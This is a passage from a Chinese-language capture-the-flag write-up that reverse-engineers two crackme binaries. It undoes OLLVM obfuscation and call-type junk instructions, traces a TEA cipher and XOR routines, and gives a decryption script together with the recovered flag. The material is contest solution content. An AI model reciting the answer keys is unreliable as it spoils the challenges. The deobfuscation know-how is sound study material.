<h3 id="011vm："><a href="#011vm：" class="headerlink" title="011vm："></a>011vm：</h3><p>反编译发现代码结构非常混乱，结合题目名称和介绍得知是<code>ollvm</code>混淆，使用<code>D-810</code>插件反混淆后再次反编译，先简要进行动态调试，发现被加密的输入内容和被加密的真正的flag进行比对的步骤在<code>transform</code>中的<code>v11 = memcmp(s1, s2, 0x20uLL);</code>这一行，s1是加密后的输入内容，s2是被加密的真正的flag，观察发现到比较s1与s2这一步时，s1的值恰好是上文提到的在t3被printf的值，若s1只输入一种字符（如32个2），则能体现出s1是被循环加密的（并且循环周期恰好是8个字符，也就是上文提到的2组），s1与s2紧邻，s2的值为定值<font color=lime><strong>[0x28, 0x7E, 0xB9, 0x38, 0xC1, 0x10, 0xE5, 0xB7, 0xAE, 0x9F, 0xB2, 0xB4, 0xD7, 0xBB, 0x93, 0x55, 0x9E, 0x9B, 0x2E, 0x3C, 0x37, 0xC6, 0x71, 0x16, 0xB5, 0x8C, 0x3A, 0x8F, 0x15, 0xE5, 0x16, 0x51]</strong></font>，那么可以验证s2就是被加密后的flag，经过观察发现栈上这些数据之间的关系为：<br><br>s1（修改的输入值）																32个字符<br><br>S2（修改的flag值）																32个字符<br><br>猜测是循环加密的秘钥，值为<font color=LimeGreen><strong>[0x14, 0x13, 0x12, 0x11, 0x25, 0x24, 0x23, 0x22, 0x36, 0x35, 0x34, 0x33, 0x44, 0x43, 0x42, 0x41]</strong></font>			16个字符<br><br>未知																			176个字符<br><br>输入的字符 																	32个字符<br><br>（以下内容包含流程解释，因此以图片形式展示）：<br><img src="/pictures/ns24_011vm.png" title="011vm"><br>进行正向测试（这里输入了12345678作为前8个字符的测试）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="number">0x34333231</span></span><br><span class="line">v4 = <span class="number">0x38373635</span></span><br><span class="line">v5 = [<span class="number">0x11121314</span>, <span class="number">0x22232425</span>, <span class="number">0x33343536</span>, <span class="number">0x41424344</span>] <span class="comment"># 密钥</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v7 = (v7 + <span class="number">0x9E3779B9</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  v6 = (v6 + ((v5[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v7 + v4) ^ (v5[<span class="number">0</span>] + <span class="number">16</span> * v4))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  v4 = (v4 + ((v5[<span class="number">3</span>] + (v6 &gt;&gt; <span class="number">5</span>)) ^ (v7 + v6) ^ (v5[<span class="number">2</span>] + <span class="number">16</span> * v6))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%#x&#x27;</span> % v6, <span class="string">&#x27;%#x&#x27;</span> % v4)</span><br></pre></td></tr></table></figure>
<p>输出结果为：<code>0x6e9bbeb4</code> <code>0x443b7474</code><br><br>再看看IDA动态调试的结果，与输出结果完全一致，由此找到测试程序与实际输出的对应关系：v6对应前四个字符的小端序dword，v4对应后四个字符的小端序dword，输出结果的v6是加密后的前四个字符的小端序dword，v4也是加密后的后四个字符的小端序dword，至此T170函数的主要部分（TEA加密）已经解析完成。</p>
<p>接着解析T170函数最后的剩余部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  v9 = (__int64)v14;</span><br><span class="line">  v10 = v17;</span><br><span class="line">  **v14 = *v16;						--&gt;	加密后的前四个字符的小端序dword</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)v9 + <span class="number">4LL</span>) = *v10;		--&gt;	加密后的后四个字符的小端序dword</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只是简单的把加密后的结果挪回去了，接着分析<code>transform</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v15 = *v24;				--&gt;	<span class="number">513353247</span></span><br></pre></td></tr></table></figure>
<p>…跳过很多break…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v15 != <span class="number">513353247</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v10 = v24;</span><br><span class="line">  *(_DWORD *)v22 += <span class="number">2</span>;			--&gt;	循环计数器+<span class="number">2</span>次</span><br><span class="line">  *v10 = <span class="number">645341807</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现在执行完多次T170后程序会跳到T160函数，而T160函数仅仅是一个简单的打印加密结果，而剩下的<code>transform</code>只用来返回比较结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>剩下的main只用来输出对错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  *(v11 - <span class="number">16</span>) = v3 != <span class="number">0</span>;</span><br><span class="line">  v12 = (<span class="type">int</span> *)&amp;v6[<span class="number">-16</span>];</span><br><span class="line">  *(_DWORD *)&amp;v6[<span class="number">-16</span>] = <span class="number">257852147</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *v12;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">257852147</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="number">908161670</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*v8 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v4 = <span class="number">2118084167</span>;</span><br><span class="line">      *v12 = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">319109003</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">908161670</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Sorry...\n&quot;</span>);</span><br><span class="line">      *v12 = <span class="number">319109003</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2118084167</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Right!!!\n&quot;</span>);</span><br><span class="line">      *v12 = <span class="number">319109003</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此程序解构完毕，仅有一个简单的TEA加密算法，用week2的python文件做同样处理：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag</span></span><br><span class="line">v6 = [<span class="number">0x38B97E28</span>, <span class="number">0xB4B29FAE</span>, <span class="number">0x3C2E9B9E</span>, <span class="number">0x8F3A8CB5</span>]</span><br><span class="line">v4 = [<span class="number">0xB7E510C1</span>, <span class="number">0x5593BBD7</span>, <span class="number">0x1671C637</span>, <span class="number">0x5116e515</span>]</span><br><span class="line">v5 = [<span class="number">0x11121314</span>, <span class="number">0x22232425</span>, <span class="number">0x33343536</span>, <span class="number">0x41424344</span>] <span class="comment"># 密钥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  v7 = (<span class="number">32</span> * <span class="number">0x9E3779B9</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v4[i] = (v4[i] - ((v5[<span class="number">3</span>] + (v6[i] &gt;&gt; <span class="number">5</span>)) ^ (v7 + v6[i]) ^ (v5[<span class="number">2</span>] + <span class="number">16</span> * v6[i]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v6[i] = (v6[i] - ((v5[<span class="number">1</span>] + (v4[i] &gt;&gt; <span class="number">5</span>)) ^ (v7 + v4[i]) ^ (v5[<span class="number">0</span>] + <span class="number">16</span> * v4[i]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v7 = (v7 - <span class="number">0x9E3779B9</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;%#x&#x27;</span> % v6[i], <span class="string">&#x27;%#x&#x27;</span> % v4[i])</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x67616c66</span>	<span class="number">0x3131307b</span></span><br><span class="line"><span class="number">0x315f6d76</span>	<span class="number">0x5a655f73</span></span><br><span class="line"><span class="number">0x7475425f</span>	<span class="number">0x4d30435f</span></span><br><span class="line"><span class="number">0x58453150</span>	<span class="number">0x7d21215f</span></span><br></pre></td></tr></table></figure>
<p>转化得到<font color=deepskyblue><strong>galf110{1_mvZe_stuB_M0C_XE1P}!!_</strong></font>，转换端序得到<font color=deepskyblue><strong>flag{011vm_1s_eZ_But_C0MP1EX_!!}</strong></font>.</p>
<h3 id="flowering-shrubs："><a href="#flowering-shrubs：" class="headerlink" title="flowering_shrubs："></a>flowering_shrubs：</h3><p>拖进ida惊讶地发现main函数居然是空的，考虑花指令把main混淆了，进入汇编观察代码，找到以下内容：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000000014D9                 <span class="keyword">call</span>    $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014EF                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000000014D9                 <span class="keyword">call</span>    $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014EF                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
<p>是典型的call型花指令，nop掉后再次反编译main成功：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *vars0; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  vars0 = (<span class="type">char</span> *)sub_14F0 + v3 - <span class="number">5342</span>;</span><br><span class="line">  sub_14F0(<span class="number">0LL</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续观察发现几乎所有函数都又被花指令干扰了，发现很多<code>call $+5</code>和<code>retn</code>的花指令，全部nop掉之后，观察sub_14F0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_14F0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  srand(a1);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%40s&quot;</span>, &amp;unk_40C0);<span class="comment">//读取40位存入unk_40C0</span></span><br><span class="line">  byte_4080 = <span class="number">1</span>;</span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_1548 + v1 - <span class="number">5430</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_1548(<span class="string">&quot;%40s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> __int8)aUarefirst[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是一个简单的读取输入函数，再看其中的sub_1548：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1548</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  sub_1313(v2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;unk_40C0, &amp;unk_4020, <span class="number">0x28u</span>LL) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是最终比较flag的函数，先找到定值<font color=red><strong>unk_4020</strong></font>（加密后的flag）：<font color=lime><strong>[54h, F4h, 20h, 47h, FCh, C4h, 93h, E6h, 39h, E0h, 6Eh, 00h, A5h, 6Eh, AAh, 9Fh, 7Ah, A1h, 66h, 39h, 76h, B7h, 67h, 57h, 3Dh, 95h, 61h, 22h, 55h, C9h, 3Bh, 4Eh, 4Fh, E8h, 66h, 08h, 3Dh, 50h, 43h, 3Eh]</strong></font>，然后分析<font color=red><strong>sub_1313</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1313</span><span class="params">(_BYTE *a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  *a1 ^= a2;</span><br><span class="line">  a1[<span class="number">1</span>] ^= *a1;</span><br><span class="line">  <span class="keyword">return</span> sub_137B();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现是将a1的当前字节先与a2进行异或，再将a1的下一个字节与a1的当前字节进行异或，再看<font color=red><strong>sub_137B</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_137B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">1LL</span>) = *v0 + *(_BYTE *)(v2 - <span class="number">28</span>);</span><br><span class="line">  *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">2LL</span>) ^= *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">1LL</span>);</span><br><span class="line">  *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">2LL</span>) -= *(_BYTE *)(v2 - <span class="number">28</span>);</span><br><span class="line">  *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">3LL</span>) ^= *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">2LL</span>);</span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_1410 + v1 - <span class="number">5118</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_1410();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font color=red><strong>sub_137B</strong></font>也进行了一些加密操作：<br><br>① 将 v0 指向的字节与 v2 - 28 指向的字节相加，结果存储在 v2 - 24 指向的地址加 1 的位置。<br><br>② 将 v2 - 24 指向的地址加 2 的位置的字节与 v2 - 24 指向的地址加 1 的位置的字节进行异或操作。<br><br>③ 将 v2 - 24 指向的地址加 2 的位置的字节减去 v2 - 28 指向的字节。<br><br>④ 将 v2 - 24 指向的地址加 3 的位置的字节与 v2 - 24 指向的地址加 2 的位置的字节进行异或操作。<br><br>接着看<font color=red><strong>sub_1410</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1410</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_1434 + v0 - <span class="number">5154</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_1434();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只是简单地转到了<font color=red><strong>sub_1434</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1434</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_1453 + v3 - <span class="number">5185</span>;</span><br><span class="line">  sub_1453(a1, a2, a3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现只是简单地执行了<font color=red><strong>sub_1453</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1453</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  *v3 = (_BYTE)a3;</span><br><span class="line">  <span class="keyword">if</span> ( ++dword_40B4 &lt;= <span class="number">9</span> )<span class="comment">//由于这里大概是要执行10次，联想到部分加密一次处理4个字符，这个函数大概是控制把输入值的不同部分全部加密一遍</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(v5 - <span class="number">1</span>) = sub_11C9(a1, a2);</span><br><span class="line">    retaddr = (<span class="type">char</span> *)&amp;loc_14B8 + v4 - <span class="number">5286</span>;</span><br><span class="line">    a2 = (<span class="type">char</span> **)(<span class="type">unsigned</span> __int8)aUarefirst[dword_40B4];</span><br><span class="line">    a1 = (__int64)&amp;unk_40C0 + *(<span class="type">unsigned</span> __int8 *)(v5 - <span class="number">1</span>);</span><br><span class="line">    sub_1313(a1, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  main(a1, a2, a3);<span class="comment">//递归调用main</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再查看<font color=red><strong>sub_11C9</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_11C9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rand();</span><br><span class="line">  <span class="keyword">return</span> sub_1216();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<font color=red><strong>sub_11C9</strong></font>生成了一个疑似没用的随机数并返回了<font color=red><strong>sub_1216</strong></font>的值，观察<font color=red><strong>sub_1216</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1216</span><span class="params">(__int64 a1, __int64 a2, <span class="type">char</span> a3, <span class="type">char</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  *(_BYTE *)(v6 - <span class="number">1</span>) = a4 - <span class="number">8</span> * (a3 + v4);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_1257 + v5 - <span class="number">4677</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_1257(a1, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font color=red><strong>sub_1216</strong></font>计算了<code>a4 - 8 \* (a3 + v4)</code>并存储在<code>v6 - 1</code>指向的字节中，然后生成了一个随机数并存储在<code>v7</code>中，接着调用了<font color=red><strong>sub_1257</strong></font>，分析<font color=red><strong>sub_1257</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1257</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_1285 + v2 - <span class="number">4723</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_1285(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只是简单地返回了<font color=red><strong>sub_1285</strong></font>的值，查看<font color=red><strong>sub_1285</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1285</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_12A2 + v0 - <span class="number">4752</span>;</span><br><span class="line">  sub_12A2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只是简单地返回了<font color=red><strong>sub_12A2</strong></font>的值，查看<font color=red><strong>sub_12A2</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12A2</span><span class="params">(__int64 a1, __int64 a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  *(_BYTE *)(v4 - <span class="number">1</span>) = a3;</span><br><span class="line">  *(_BYTE *)(v4 - <span class="number">1</span>) &amp;= <span class="number">0xFCu</span>;</span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_12CA + v3 - <span class="number">4792</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_12CA(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font color=red><strong>sub_12A2</strong></font>将<code>a3</code>存入<code>v4-1</code>对应的字节，并使<code>v4-1</code>与<code>0xFC</code>进行按位与操作，然后返回<font color=red><strong>sub_12CA</strong></font>的值，查看<font color=red><strong>sub_12CA</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_12CA</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+8h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  retaddr = (<span class="type">char</span> *)sub_12EC + v0 - <span class="number">4826</span>;</span><br><span class="line">  sub_12EC();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只是简单地返回了<font color=red><strong>sub_12EC</strong></font>的值，查看<font color=red><strong>sub_12EC</strong></font>：</p>
